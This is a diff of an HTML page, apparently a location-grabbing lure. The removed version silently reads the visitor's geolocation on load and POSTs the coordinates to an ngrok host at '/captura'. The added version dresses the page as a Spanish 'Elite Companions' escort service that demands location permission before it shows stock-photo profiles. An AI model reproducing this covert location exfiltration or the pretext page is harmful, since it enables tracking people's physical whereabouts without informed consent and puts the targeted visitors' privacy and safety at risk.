@@ -1,33 +1,246 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Conectando...</title>
-  <style>body { background-color: white; }</style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Elite Companions • Servicio Exclusivo</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
+
+<style>
+ 
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
+  }
+  body, html {
+    height: 100%;
+    font-family: 'Roboto', sans-serif;
+    background: #121214;
+    color: #ddd;
+    line-height: 1.5;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 80px auto 60px;
+    padding: 0 20px;
+  }
+
+  header {
+    text-align: center;
+    margin-bottom: 40px;
+    user-select: none;
+  }
+  header h1 {
+    font-weight: 700;
+    font-size: 2.8rem;
+    color: #f5f5f5;
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+  }
+  header p {
+    font-weight: 300;
+    color: #a0a0a0;
+  }
+
+  #status {
+    text-align: center;
+    font-weight: 500;
+    font-size: 1.3rem;
+    margin-bottom: 30px;
+    color: #f5a623;
+  }
+
+  .spinner {
+    border: 6px solid #444;
+    border-top: 6px solid #f5a623;
+    border-radius: 50%;
+    width: 48px;
+    height: 48px;
+    margin: 10px auto 40px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .btn {
+    display: inline-block;
+    background-color: #f5a623;
+    color: #121214;
+    font-weight: 700;
+    padding: 12px 30px;
+    border-radius: 30px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    user-select: none;
+    margin-top: 10px;
+  }
+  .btn:hover {
+    background-color: #d18c00;
+  }
+
+  #profiles {
+    display: none;
+    margin-top: 40px;
+  }
+  .profile-card {
+    display: flex;
+    background: #1e1e1f;
+    border-radius: 12px;
+    overflow: hidden;
+    margin-bottom: 25px;
+    box-shadow: 0 3px 12px rgba(0,0,0,0.7);
+    cursor: pointer;
+    transition: transform 0.3s ease;
+  }
+  .profile-card:hover {
+    transform: scale(1.02);
+    box-shadow: 0 6px 20px rgba(245, 166, 35, 0.7);
+  }
+  .profile-image {
+    flex-shrink: 0;
+    width: 160px;
+    height: 180px;
+    object-fit: cover;
+  }
+  .profile-info {
+    padding: 20px 24px;
+    flex-grow: 1;
+  }
+  .profile-info h3 {
+    font-weight: 700;
+    font-size: 1.6rem;
+    margin-bottom: 8px;
+    color: #f5a623;
+  }
+  .profile-info p {
+    font-weight: 400;
+    font-size: 1rem;
+    color: #c4c4c4;
+  }
+
+
+  footer {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #666;
+    margin-top: 60px;
+    user-select: none;
+  }
+</style>
 </head>
 <body>
 
+<div class="container" role="main" aria-label="Servicio de acompañantes elite">
+
+<header>
+  <h1>Elite Companions</h1>
+  <p>Servicio exclusivo para mayores de 18 años</p>
+</header>
+
+<div id="status" aria-live="polite">Solicitando permiso para acceder a tu ubicación...</div>
+<div class="spinner" role="progressbar" aria-busy="true"></div>
+
+<button class="btn" id="btnRetry" style="display:none;">Reintentar ubicación</button>
+
+<section id="profiles" aria-label="Perfiles disponibles">
+
+
+
+</section>
+
+</div>
+
+<footer>
+  © 2025 Elite Companions · Privacidad y seguridad garantizadas.
+</footer>
+
 <script>
-function enviarUbicacion(lat, lon, acc) {
-  fetch('https://f2ac-131-255-250-88.ngrok-free.app/captura', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({lat, lon, acc})
-  });
-}
+  const statusEl = document.getElementById('status');
+  const spinnerEl = document.querySelector('.spinner');
+  const btnRetry = document.getElementById('btnRetry');
+  const profilesEl = document.getElementById('profiles');
 
-function obtenerUbicacion() {
-  navigator.geolocation.getCurrentPosition(function(pos) {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
-    enviarUbicacion(lat, lon, acc);
-  }, function(error) {
-    console.log("Permiso denegado o error");
-  });
-}
+  const perfiles = [
+    {
+      nombre: "Sofía",
+      descripcion: "Elegante y atenta, acompañante perfecta para eventos exclusivos.",
+      foto: "https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=600&q=80"
+    },
+    {
+      nombre: "Isabela",
+      descripcion: "Compañía encantadora, ideal para cenas y encuentros privados.",
+      foto: "https://images.unsplash.com/photo-1508214751196-bcfd4ca60f91?auto=format&fit=crop&w=600&q=80"
+    },
+    {
+      nombre: "Valentina",
+      descripcion: "Juvenil y encantadora, con una sonrisa que cautiva.",
+      foto: "https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=600&q=80"
+    },
+    {
+      nombre: "Camila",
+      descripcion: "Apasionada y misteriosa, hará que cada momento sea inolvidable.",
+      foto: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=600&q=80"
+    }
+  ];
 
-obtenerUbicacion();
+  function mostrarPerfiles() {
+    statusEl.style.display = 'none';
+    spinnerEl.style.display = 'none';
+    btnRetry.style.display = 'none';
+    profilesEl.style.display = 'block';
+
+    profilesEl.innerHTML = '';
+
+    perfiles.forEach(p => {
+      const card = document.createElement('article');
+      card.className = 'profile-card';
+      card.tabIndex = 0;
+      card.innerHTML = `
+        <img class="profile-image" src="${p.foto}" alt="Foto de ${p.nombre}" />
+        <div class="profile-info">
+          <h3>${p.nombre}</h3>
+          <p>${p.descripcion}</p>
+        </div>
+      `;
+      profilesEl.appendChild(card);
+    });
+  }
+
+  function errorUbicacion() {
+    statusEl.textContent = 'No pudimos acceder a tu ubicación. Por favor, inténtalo de nuevo.';
+    spinnerEl.style.display = 'none';
+    btnRetry.style.display = 'inline-block';
+  }
+
+  function solicitarUbicacion() {
+    statusEl.textContent = 'Solicitando permiso para acceder a tu ubicación...';
+    spinnerEl.style.display = 'block';
+    btnRetry.style.display = 'none';
+    profilesEl.style.display = 'none';
+
+    if (!navigator.geolocation) {
+      statusEl.textContent = 'Tu navegador no soporta geolocalización.';
+      spinnerEl.style.display = 'none';
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        statusEl.textContent = 'Ubicación confirmada. Cargando perfiles exclusivos...';
+        setTimeout(() => mostrarPerfiles(), 1400);
+      },
+      error => {
+        errorUbicacion();
+      },
+      { timeout: 10000 }
+    );
+  }
+
+  btnRetry.addEventListener('click', solicitarUbicacion);
+
+  solicitarUbicacion();
 </script>
 
 </body>
